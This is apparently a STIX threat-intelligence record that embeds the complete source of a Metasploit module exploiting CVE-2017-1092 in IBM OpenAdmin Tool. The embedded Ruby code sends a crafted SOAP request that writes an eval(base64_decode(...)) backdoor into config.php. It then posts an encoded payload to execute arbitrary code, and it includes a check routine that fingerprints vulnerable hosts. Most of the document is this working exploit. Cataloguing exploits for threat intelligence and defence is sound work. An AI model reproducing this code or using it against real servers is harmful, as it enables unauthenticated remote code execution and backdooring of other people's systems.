{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9f0d9360-dd15-482f-873a-cc44ebefa923",
    "created": "2024-08-14T17:09:53.465598Z",
    "modified": "2024-08-14T17:09:53.465602Z",
    "name": "IBM OpenAdmin Tool SOAP welcomeServer PHP Code Execution",
    "description": " This module exploits an unauthenticated remote PHP code execution vulnerability in IBM OpenAdmin Tool included with IBM Informix versions 11.5, 11.7, and 12.1.  The 'welcomeServer' SOAP service does not properly validate user input in the 'new_home_page' parameter of the 'saveHomePage' method allowing arbitrary PHP code to be written to the config.php file. The config.php file is executed in most pages within the application, and accessible directly via the web root, resulting in code execution.  This module has been tested successfully on IBM OpenAdmin Tool 3.14 on Informix 12.10 Developer Edition (SUSE Linux 11) virtual appliance.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/ibm_openadmin_tool_soap_welcomeserver_exec.rb",
            "external_id": "ibm_openadmin_tool_soap_welcomeserver_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-1092"
        },
        {
            "source_name": "reference",
            "url": "https://www-01.ibm.com/support/docview.wss?uid=swg22002897"
        },
        {
            "source_name": "reference",
            "url": "https://blogs.securiteam.com/index.php/archives/3210"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2017/May/105"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include REXML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'IBM OpenAdmin Tool SOAP welcomeServer PHP Code Execution',\n      'Description'    => %q{\n        This module exploits an unauthenticated remote PHP code execution\n        vulnerability in IBM OpenAdmin Tool included with IBM Informix\n        versions 11.5, 11.7, and 12.1.\n\n        The 'welcomeServer' SOAP service does not properly validate user input\n        in the 'new_home_page' parameter of the 'saveHomePage' method allowing\n        arbitrary PHP code to be written to the config.php file. The config.php\n        file is executed in most pages within the application, and accessible\n        directly via the web root, resulting in code execution.\n\n        This module has been tested successfully on IBM OpenAdmin Tool 3.14\n        on Informix 12.10 Developer Edition (SUSE Linux 11) virtual appliance.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'SecuriTeam', # Discovery and exploit\n          'bcoles', # Metasploit\n        ],\n      'References'     =>\n        [\n          ['CVE', '2017-1092'],\n          ['EDB', '42091'],\n          ['URL', 'https://www-01.ibm.com/support/docview.wss?uid=swg22002897'],\n          ['URL', 'https://blogs.securiteam.com/index.php/archives/3210'],\n          ['URL', 'https://seclists.org/fulldisclosure/2017/May/105']\n        ],\n      'Platform'       => 'php',\n      'Arch'           => ARCH_PHP,\n      'Privileged'     => false, # Privileged on Windows but not on *nix targets\n      'Targets'        => [['Generic (PHP Payload)', {}]],\n      'DisclosureDate' => '2017-05-30',\n      'DefaultTarget'  => 0))\n    register_options(\n      [\n        OptString.new('TARGETURI', [ true, 'The base path to IBM OpenAdmin Tool', '/openadmin' ])\n      ]\n    )\n  end\n\n  def set_home_page(homepage)\n    xml = Document.new\n    xml.add_element 'soapenv:Envelope', 'xmlns:xsi'     => 'http://www.w3.org/2001/XMLSchema-instance',\n                                        'xmlns:xsd'     => 'http://www.w3.org/2001/XMLSchema',\n                                        'xmlns:soapenv' => 'http://schemas.xmlsoap.org/soap/envelope/',\n                                        'xmlns:urn'     => 'urn:Welcome'\n    xml.root.add_element 'soapenv:Header'\n    xml.root.add_element 'soapenv:Body'\n    body = xml.root.elements[2]\n    body.add_element 'urn:saveHomePage', 'soapenv:encodingStyle' => 'http://schemas.xmlsoap.org/soap/encoding/'\n    new_home_page = body.elements[1].add_element 'new_home_page', 'xsi:type' => 'xsd:string'\n    new_home_page.text = homepage\n\n    uri = normalize_uri target_uri.path, 'services', 'welcome', 'welcomeService.php'\n    send_request_cgi 'method'  => 'POST',\n                     'uri'     => uri,\n                     'ctype'   => 'text/xml; charset=UTF-8',\n                     'headers' => { 'SOAPAction' => 'urn:QBEAction' },\n                     'data'    => xml.to_s\n  end\n\n  def check\n    fingerprint = Rex::Text.rand_text_alpha(rand(10) + 6)\n    res = set_home_page \"\\\";##{fingerprint}\"\n\n    unless res\n      vprint_status \"#{peer} Connection failed\"\n      return CheckCode::Unknown\n    end\n\n    if res.code == 200 && res.body =~ %r{<ns1:saveHomePageResponse><return xsi:type=\"xsd:string\">\";##{fingerprint}</return>}\n      return CheckCode::Detected\n    end\n\n    Msf::Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    cmd_param = Rex::Text.rand_text_alpha(rand(10) + 6)\n\n    res = set_home_page \"\\\";eval(base64_decode($_POST['#{cmd_param}'])); #\"\n\n    unless res\n      vprint_status \"#{peer} Connection failed\"\n      return CheckCode::Unknown\n    end\n\n    if res.code == 200 && res.body =~ /<ns1:saveHomePageResponse><return xsi:type=\"xsd:string\">\";eval/\n      print_good \"#{peer} Wrote backdoor to config.php file successfully\"\n    else\n      fail_with Failure::UnexpectedReply, \"#{peer} Failed to backdoor config.php\"\n    end\n\n    vprint_status \"#{peer} Executing payload...\"\n    send_request_cgi({ 'method'    => 'POST',\n                       'uri'       => normalize_uri(target_uri.path, 'conf', 'config.php'),\n                       'vars_post' => { cmd_param => Rex::Text.encode_base64(payload.encoded) } }, 5)\n\n    print_warning \"#{peer} Replace the 'config.php' file with 'BAKconfig.php' to remove the backdoor\"\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-05-30",
    "x_mitre_platforms": [
        "php'"
    ]
}